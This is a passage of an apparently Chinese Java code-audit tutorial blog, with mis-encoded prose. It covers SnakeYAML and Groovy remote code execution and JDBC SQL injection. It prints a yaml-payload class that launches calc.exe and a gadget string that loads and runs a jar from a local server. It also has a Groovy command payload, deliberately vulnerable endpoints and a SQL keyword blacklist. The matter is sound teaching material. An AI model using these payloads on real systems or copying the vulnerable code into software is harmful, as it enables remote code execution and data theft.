å†™åœ¨ä¸€è¡Œ</span></span><br><span class="line"><span class="attr">address:</span> &#123;<span class="attr">province:</span> <span class="string">å±±ä¸œ</span>, <span class="attr">city:</span> <span class="string">æµå—</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™åœ¨å¤šè¡Œ</span></span><br><span class="line"><span class="attr">address:</span></span><br><span class="line"><span class="attr">province:</span> <span class="string">å±±ä¸œ</span></span><br><span class="line"><span class="attr">city:</span> <span class="string">æµå—</span></span><br></pre></td></tr></table></figure></div><p>â— æ•°ç»„</p><div class="highlight-wrap" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å†™åœ¨ä¸€è¡Œ</span></span><br><span class="line"><span class="attr">hobbyList:</span> [<span class="string">æ¸¸æ³³</span>, <span class="string">è·‘æ­¥</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™åœ¨å¤šè¡Œ</span></span><br><span class="line"><span class="attr">hobbyList:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">æ¸¸æ³³</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">è·‘æ­¥</span></span><br></pre></td></tr></table></figure></div><p>â— çº¯é‡</p><div class="highlight-wrap" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å­—ç¬¦ä¸² é»˜è®¤ä¸ç”¨åŠ å¼•å·ï¼ŒåŒ…å«ç©ºæ ¼æˆ–ç‰¹æ®Šå­—ç¬¦å¿…é¡»åŠ å¼•å·ï¼Œå•å¼•å·æˆ–åŒå¼•å·éƒ½å¯ä»¥</span></span><br><span class="line"><span class="attr">userId:</span> <span class="string">S123</span></span><br><span class="line"><span class="attr">username:</span> <span class="string">&quot;lisi&quot;</span></span><br><span class="line"><span class="attr">password:</span> <span class="string">&#x27;123456&#x27;</span></span><br><span class="line"><span class="attr">province:</span> <span class="string">å±±ä¸œ</span></span><br><span class="line"><span class="attr">city:</span> <span class="string">&quot;æµå— : ss&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¸ƒå°”å€¼</span></span><br><span class="line"><span class="attr">success:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ•´æ•°</span></span><br><span class="line"><span class="attr">age:</span> <span class="number">13</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æµ®ç‚¹æ•°</span></span><br><span class="line"><span class="attr">weight:</span> <span class="number">75.5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Null</span></span><br><span class="line"><span class="attr">gender:</span> <span class="string">~</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ—¶é—´</span></span><br><span class="line"><span class="attr">createDate:</span> <span class="number">2001-12-14T21:59:43.10+05</span></span><br></pre></td></tr></table></figure></div><p>æ¼æ´åˆ†æï¼Œå…·ä½“æ¼æ´ä»£ç å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/vuln/yarm&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">yarm</span><span class="params">(String content)</span> &#123;</span><br><span class="line">    <span class="type">Yaml</span> <span class="variable">y</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">    y.load(content);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping(&quot;/sec/yarm&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">secYarm</span><span class="params">(String content)</span> &#123;</span><br><span class="line">    <span class="type">Yaml</span> <span class="variable">y</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>(<span class="keyword">new</span> <span class="title class_">SafeConstructor</span>());</span><br><span class="line">    y.load(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>Payload é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a> ,æ¶æ„ä»£ç å¦‚ä¸‹</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> artsploit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AwesomeScriptEngineFactory</span> <span class="keyword">implements</span> <span class="title class_">ScriptEngineFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AwesomeScriptEngineFactory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">            <span class="comment">//Runtime.getRuntime().exec(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getExtensions</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getMimeTypes</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getNames</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getParameter</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMethodCallSyntax</span><span class="params">(String obj, String m, String... args)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getOutputStatement</span><span class="params">(String toDisplay)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getProgram</span><span class="params">(String... statements)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ScriptEngine <span class="title function_">getScriptEngine</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>æ¼æ´å¤ç°ï¼Œå…ˆç¼–è¯‘ <code>java</code> å†å°†æ¶æ„ä»£ç å¸¦å…¥ <code>yaml-payload.jar</code></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924203259186.png" data-caption="image-20220924203259186"><img src="/../images/Java/rce/image-20220924203259186.png" alt="image-20220924203259186"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924212111867.png" data-caption="image-20220924212111867"><img src="/../images/Java/rce/image-20220924212111867.png" alt="image-20220924212111867"></a></p><p>ç„¶åVPS <code>Python</code> ä¸´æ—¶èµ·ä¸€ä¸ªæœåŠ¡æ”¾ç½® <code>yaml-payload.jar</code>ï¼ˆè¿™é‡Œä½¿ç”¨æœ¬æœºèµ·æœåŠ¡ï¼‰</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924212749312.png" data-caption="image-20220924212749312"><img src="/../images/Java/rce/image-20220924212749312.png" alt="image-20220924212749312"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924212459768.png" data-caption="image-20220924212459768"><img src="/../images/Java/rce/image-20220924212459768.png" alt="image-20220924212459768"></a></p><p>æ‹¼æ¥å¦‚ä¸‹å†…å®¹ï¼š</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [&quot;http://127.0.0.1:8000/yaml-payload.jar&quot;]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div><p>è®¿é—®åå¼¹å‡ºè®°äº‹æœ¬</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [&quot;http://127.0.0.1:8000/yaml-payload.jar&quot;]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924212609577.png" data-caption="image-20220924212609577"><img src="/../images/Java/rce/image-20220924212609577.png" alt="image-20220924212609577"></a></p><br/><h3 id="äº”ã€Groovy"><a href="#äº”ã€Groovy" class="headerlink" title="äº”ã€Groovy"></a>äº”ã€Groovy</h3><p><code>Groovy</code> æ˜¯ä¸€ç§åŸºäºJavaå¹³å°çš„é¢å‘å¯¹è±¡è¯­è¨€ã€‚ </p><p>æ¼æ´åˆ†æï¼Œå…·ä½“æ¼æ´ä»£ç å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;groovy&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">groovyshell</span><span class="params">(String content)</span> &#123;</span><br><span class="line">    <span class="type">GroovyShell</span> <span class="variable">groovyShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line">    groovyShell.evaluate(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ä¸»è¦åŸç†ï¼Œä¸å®‰å…¨çš„ä½¿ç”¨äº† <code>Groovy</code> è°ƒç”¨å‘½ä»¤ï¼Œå¯¹ç”¨æˆ·çš„è¾“å…¥æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ã€‚<code>content</code> ä¸ºç”¨æˆ·è¾“å…¥çš„å‘½ä»¤ï¼Œgroovy æ¥æ”¶æŒ‡ä»¤åï¼Œåˆ©ç”¨ <code>evaluate</code> è¿›è¡Œæ‰§è¡Œã€‚</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220923105400989.png" data-caption="image-20220923105400989"><img src="/../images/Java/rce/image-20220923105400989.png" alt="image-20220923105400989"></a></p><p>æ¼æ´å¤ç°ï¼Œæ„é€ é“¾æ¥ä¸ºï¼š<code>http://127.0.0.1:8080/rce/groovy?content=&quot;calc&quot;.execute()</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924205355487.png" data-caption="image-20220924205355487"><img src="/../images/Java/rce/image-20220924205355487.png" alt="image-20220924205355487"></a></p><br/><h3 id="å…­ã€å…¶ä»–"><a href="#å…­ã€å…¶ä»–" class="headerlink" title="å…­ã€å…¶ä»–"></a>å…­ã€å…¶ä»–</h3><p>1ï¼‰ç”±äºä»£ç å¯¹äºç”¨æˆ·ä¼ å…¥çš„ç±»ã€ç±»çš„æ–¹æ³•ã€ç±»çš„å‚æ•°æ²¡æœ‰åšä»»ä½•é™åˆ¶ï¼Œäº¦å¯ä»¥å¯¼è‡´ RCE çš„äº§ç”Ÿã€‚<br>2ï¼‰ç”±è¡¨è¾¾å¼æ³¨å…¥å¯¼è‡´çš„RCEæ¼æ´ï¼Œå¸¸è§çš„å¦‚ï¼šOGNLã€SpELã€MVELã€ELã€Felã€JST+EL ç­‰<br>3ï¼‰ç”±javaåç«¯æ¨¡æ¿å¼•æ“æ³¨å…¥å¯¼è‡´çš„ RCE æ¼æ´ï¼Œå¸¸è§çš„å¦‚ï¼šFreemarkerã€Velocityã€Thymeleaf ç­‰<br>4ï¼‰ç”±ç¬¬ä¸‰æ–¹å¼€æºç»„ä»¶å¼•èµ·çš„ RCE æ¼æ´ï¼Œå¸¸è§çš„å¦‚ï¼šFastjsonã€Shiroã€Xstreamã€Struts2ã€weblogic ç­‰</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¿™é‡Œåªå‚è€ƒäº† <code>Java-sec-code</code> é¡¹ç›®ä¸­çš„ <code>RCE</code> æ¼æ´è¿›è¡Œå­¦ä¹ ï¼Œå½“ç„¶å®æˆ˜ä¸­çš„å˜åŒ–ä¹Ÿä¸å•å•åªæœ‰è¿™äº›ä¿—å¥—çš„å¥—è·¯ã€‚åç»­ä¼šç»§ç»­å­¦ä¹ å…¶ä»–çš„æŒ–æ˜æ–¹æ³•ã€åˆ©ç”¨æ–¹æ³•ã€‚</p><h2 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/articles/web/338055.html</span><br><span class="line">https://cbatl.gitee.io/2021/12/09/javaseccode1/</span><br><span class="line">https://www.cnpanda.net/codeaudit/705.html</span><br><span class="line">https://www.ol4three.com/2021/08/12/WEB/Code_audit/Java-sec-code%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</span><br><span class="line">https://www.cnblogs.com/CoLo/p/15240834.html#:~:text=ProcessBuilder%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%201%E3%80%81%E5%88%9B%E5%BB%BAProcessBuilder%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1,2%E3%80%81%E8%B0%83%E7%94%A8start%E6%96%B9%E6%B3%95%E6%89%A7%E8%A1%8C%203%E3%80%81%E8%BF%94%E5%9B%9E%E7%9A%84Process%E5%AF%B9%E8%B1%A1%E8%B0%83%E7%94%A8getInputStream%E8%8E%B7%E5%8F%96%E8%BE%93%E5%85%A5%E6%B5%81%204%E3%80%81%E8%AF%BB%E5%8F%96%E8%BE%93%E5%85%A5%E6%B5%81%E5%86%99%E5%85%A5%E8%BE%93%E5%87%BA%E6%B5%81</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javaä»£ç å®¡è®¡ </tag>
            
            <tag> è¿œç¨‹ä»£ç æ‰§è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaä»£ç å®¡è®¡(ä¸€)-SQLæ³¨å…¥</title>
      <link href="/2022/09/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%B8%80)-SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/09/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%B8%80)-SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="SQL-Injection-JDBC"><a href="#SQL-Injection-JDBC" class="headerlink" title="SQL Injection - JDBC"></a>SQL Injection - JDBC</h2><p>SQLI(SQL Injection)ï¼Œ SQLæ³¨å…¥æ˜¯å› ä¸ºç¨‹åºæœªèƒ½æ­£ç¡®å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œæ£€æŸ¥ï¼Œå°†ç”¨æˆ·çš„è¾“å…¥ä»¥æ‹¼æ¥çš„æ–¹å¼å¸¦å…¥SQLè¯­å¥ï¼Œå¯¼è‡´äº†SQLæ³¨å…¥çš„äº§ç”Ÿã€‚æ”»å‡»è€…å¯é€šè¿‡SQLæ³¨å…¥ç›´æ¥è·å–æ•°æ®åº“ä¿¡æ¯ï¼Œé€ æˆä¿¡æ¯æ³„æ¼ã€‚JDBCæœ‰ä¸¤ä¸ªæ–¹æ³•æ‰§è¡ŒSQLè¯­å¥ï¼Œåˆ†åˆ«æ˜¯PrepareStatementå’ŒStatementã€‚</p><br/><h3 id="ä¸€ã€PrepareStatementå’ŒStatementçš„åŒºåˆ«"><a href="#ä¸€ã€PrepareStatementå’ŒStatementçš„åŒºåˆ«" class="headerlink" title="ä¸€ã€PrepareStatementå’ŒStatementçš„åŒºåˆ«"></a>ä¸€ã€PrepareStatementå’ŒStatementçš„åŒºåˆ«</h3><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre># å½“ä½¿ç”¨Statementå¯¹è±¡æ—¶ï¼Œæ¯æ¬¡æ‰§è¡Œä¸€ä¸ªSQLå‘½ä»¤æ—¶ï¼Œéƒ½ä¼šå¯¹å®ƒè¿›è¡Œè§£æå’Œç¼–è¯‘ã€‚# å½“ä½¿ç”¨PreparedStatementå¯¹è±¡æ—¶ï¼Œæ— è®ºå¤šå°‘æ¬¡åœ°ä½¿ç”¨åŒä¸€ä¸ªSQLå‘½ä»¤ï¼Œéƒ½åªä¼šè§£æå’Œç¼–è¯‘ä¸€æ¬¡ã€‚</pre></td></tr></tbody></table></figure><br/><h3 id="äºŒã€ç®€å•æ¼æ´ä¾‹å­"><a href="#äºŒã€ç®€å•æ¼æ´ä¾‹å­" class="headerlink" title="äºŒã€ç®€å•æ¼æ´ä¾‹å­"></a>äºŒã€ç®€å•æ¼æ´ä¾‹å­</h3><p>1ã€æ¼æ´ä»£ç  - è¯­å¥æ‹¼æ¥(Statement)ï¼Œæ²¡æœ‰å¯¹è¯­å¥è¿›è¡Œè¿‡æ»¤ç›´æ¥æ‹¼æ¥</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é‡‡ç”¨åŸå§‹çš„Statementæ‹¼æ¥è¯­å¥ï¼Œå¯¼è‡´æ¼æ´äº§ç”Ÿ</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">jdbcVul</span><span class="params">(String id)</span> &#123;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);</span><br><span class="line"></span><br><span class="line">        <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">        <span class="comment">// æ‹¼æ¥è¯­å¥äº§ç”ŸSQLæ³¨å…¥</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where id = &#x27;&quot;</span> + id + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">res_name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">res_pass</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;pass&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> String.format(<span class="string">&quot;æŸ¥è¯¢ç»“æœ %s: %s&quot;</span>, res_name, res_pass);</span><br><span class="line">            result.append(info);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div><p>å®‰å…¨ä»£ç  - è¿‡æ»¤æ–¹æ³•</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é‡‡ç”¨é»‘åå•è¿‡æ»¤å±é™©å­—ç¬¦ï¼ŒåŒæ—¶ä¹Ÿå®¹æ˜“è¯¯ä¼¤ï¼ˆæ¬¡æ–¹æ¡ˆï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkSql</span><span class="params">(String content)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">black</span> <span class="operator">=</span> <span class="string">&quot;&#x27;|;|--|+|,|%|=|*|(|)|like|xor|and|or|exec|insert|select|delete|update|count|drop|chr|mid|master|truncate|char|declareï½œsleep|abs|rand|union&quot;</span>;</span><br><span class="line">    String[] black_list = black.split(<span class="string">&quot;|&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span> ; i &lt; black_list.length ; i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span> (content.contains(black_list[i]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><br/><br/>2ã€æ¼æ´ä»£ç  - è¯­å¥æ‹¼æ¥(PrepareStatement)<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PrepareStatementä¼šå¯¹SQLè¯­å¥è¿›è¡Œé¢„ç¼–è¯‘ï¼Œä½†æœ‰æ—¶å¼€å‘è€…ä¸ºäº†ä¾¿åˆ©ï¼Œç›´æ¥é‡‡å–æ‹¼æ¥çš„æ–¹å¼æ„é€ SQLï¼Œæ­¤æ—¶è¿›è¡Œé¢„ç¼–è¯‘ä¹Ÿæ— ç”¨ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where id = &quot;</span> + id;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">st</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line">System.out.println(<span class="string">&quot;[*] æ‰§è¡ŒSQLè¯­å¥ï¼š&quot;</span> + st);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> st.executeQuery();</span><br></pre></td></tr></table></figure></div><p>å®‰å…¨ä»£ç  - é¢„ç¼–è¯‘</p><div 